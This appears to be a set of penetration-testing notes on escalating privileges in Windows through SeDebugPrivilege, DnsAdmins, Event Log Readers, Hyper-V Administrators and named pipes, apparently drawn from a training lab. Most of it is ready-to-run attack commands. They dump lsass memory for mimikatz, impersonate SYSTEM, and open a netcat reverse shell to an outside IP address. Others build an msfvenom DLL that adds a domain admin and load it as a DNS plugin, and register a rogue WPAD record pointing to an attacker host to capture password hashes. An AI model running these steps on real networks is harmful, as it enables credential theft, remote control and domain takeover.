      SeDebugPrivilege

        This policy setting determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.

        This permission allow us to lssas process memory. There are several ways to do so. We can do it using procdump from sysinternals and then load it to mimikatz

        procdump.exe -accepteula -ma lsass.exe lsass.dmp

        In case we are able to perform an RDP to the victim we can do it directly from the task manager. Task Manager -> Details -> lsass.exe right click -> Create dump file

        RCE by creating a child process

          By using this PoC we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights grated via SeDebugPrivilege

          In order to use it transfer it to the target machine and run the following

          . .\psgetsys.ps1
ImpersonateFromParentPid -ppid PID_OF_WINLOGON.EXE -command cmd.exe

          In order to check the process PID we can run tasklist to get a list of running processes and choose the PID from winlogon.exe since this process is executed by SYSTEM. Obiously chose a process that is being used by SYSTEM to execute the command using SYSTEM privileges

          We can also execute the command but by using the Get-Process to acquire to PID just by issuing the name of the process. Example:

          ImpersonateFromParentPid -ppid (Get-Process lsass).Id -command cmd.exe

          In case we aren't in a graphical environment this will not work. But we can use netcat to recive a reverse shell

          ImpersonateFromParentPid -ppid 5168 -command C:\Tools\nc.exe -cmdargs "10.10.14.252 3001 -e cmd.exe"

        Copying any file

          Members of Backup Operators are assigned with SeBackupPrivilege. This privlege allow us to traverse any folder and list the folder contents. This will let us copy a file from a folder even if there is no access control entry (ACE) for us. But we can't do this by using standalone copy function.

      Event Log Readers

        Sometimes we can find valuable information in logs, we can read them by using wevtutil or Get-WinEvent in powershell

        wevtutil

          qe for specifying the log file, rd indicates reverse true which orders events from new to old, /f defines the output as text

          wevtutil qe Security /rd:true /f:text | Select-String "/user"

          In case we would like to avoid certain string in our search we could use

          wevtutil qe Security /rd:true /f:text | Select-String "mary" | Where-Object { $_ -notmatch "SeAssignPrimaryTokenPrivilege"}

          We can also specify logs from a remote computer. In this case we need to specify a username and password

          wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

      Get-WinEvent

        Searching for events that contain "/user" parameter

        Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

      DnsAdmins

        Members of the DnsAdmins group have access to DNS information on the network. Since windows DNS service supports custom plugins and call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones this service is vulnerable to privilege escalation or information leakage

        The DNS service runs as NT AUTHORITY\SYSTEM. The steps to escalate are the following

        Generate a malicious DLL and transfer it to the victim machine

        msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

        Load DLL as memeber of DnsAdmins. We can check if are inside this group by using Get-ADGroupMember -Identity DnsAdmins

        dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

        Now, in order to trigger that .dll the DNS service must be restarted since the plugin will be loaded in the next start. Just by being in the DnsAdmins group does not grant us from having the privilege to restart the DNS service we can check it using

        I recommend you to perform all the following actions from CMD. Powershell does not work 
        wmic useraccount where name="netadm" get sid #View your SID
sc.exe sdshow DNS

        The output will be similar to this one, where the first A equals to Allow and RPWP are the permissions to stop and start the DNS service

        (A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
A: Allow

        Stoping and starting the DNS service

        sc stop dns
sc start dns

        WPAD poisoning

          WPAD menas Web Proxy Auto-Discovery Protocol. Is a mechaninsm used by a lot of sistems, specially browsers and Windows operating system. This is used in order to discover what proxy use in order to access internet and they ddo it automatically without needing to manually configure a proxy

          This could be dangerous since in case an attacker setups it's own server i could intercep all traffic which is going out to internet

          By default there is a parameter that blocks this attack but if we are inside dnsadmins group we could be able to disable it. Once this is done we could use a tool such as Responder or Inveigh to capture NTLMv2 hashes

          In order to disable the Global query Block list use the following command

          Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

          Now add the WPAD pointing to your attacker machine 

          Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address ATTACKER_IP

      Hyper-V Administrators

        The Hyper-V administrator group allow us to create, start, remove VMs and manage virtual disks. All operations in hyper-v are performed by NT AUTHORITY\SYSTEM and due that fact we are able to escalte our privileges

        Whenever you create a VM the process vmms.exe impersonates the user but when you delete a machine the process is being done by NT AUTHORITY\SYSTEM. Now we can create a hardlink pointing from the VHDX file created when we create the machine to a random file that we would like. Finally to abuse that we will remove the VHDX file and then remove the VM which will result in that SYSTEM will look for the VHDX file but will be redirected your our convinence file which will give it full control over it

        Here we have a POC that automates all this process. Remember to change the line of targetfile to target the file you want to get full control

        Named pipes Attack

          Processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read

          We can list named pipes by using powershell Get-ChildItem

          gci \\.\pipe\

          An example of named pipe is

          \\.\PipeName\\ExampleNamedPipeServer

          We can list permissions of named pipes by using Accesschk from sysinternals. This way we will figure out who has permissions to write, read or execute a resource

          For example there is a privesc vulnerability in windscribe software since it's pipe can be controlled by any user

          accesschk.exe -accepteula -w \pipe\WindscribeService -v
#Output
